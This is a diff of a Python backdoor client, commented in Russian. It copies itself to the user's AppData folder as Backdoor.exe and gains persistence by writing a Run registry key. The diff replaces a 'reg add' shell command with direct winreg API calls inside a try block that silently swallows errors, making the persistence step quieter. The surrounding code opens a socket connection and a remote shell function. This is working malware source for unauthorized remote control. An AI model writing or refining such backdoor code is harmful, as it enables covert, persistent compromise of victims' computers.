@@ -6,6 +6,7 @@ import time
 import os
 import shutil
 import sys
+import winreg
 
 #конвектирует данные пайтона в джейсон а его в свою очередь в байты
 def reliable_send(data):
@@ -56,8 +57,13 @@ def shell():
 location = os.environ["APPDATA"] + "\\Backdoor.exe"
 if not os.path.exists(location):
         shutil.copyfile(sys.executable, location)
-        reg_command = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d "{location}" /f '
-        subprocess.run(reg_command, shell=True, capture_output=True, text=True)
+        try:
+                with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                        r"Software\Microsoft\Windows\CurrentVersion\Run",
+                        0, winreg.KEY_SET_VALUE) as key:
+                        winreg.SetValueEx(key, "Backdoor", 0, winreg.REG_SZ, location)
+        except Exception as e:
+                pass
 
 sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 connection()
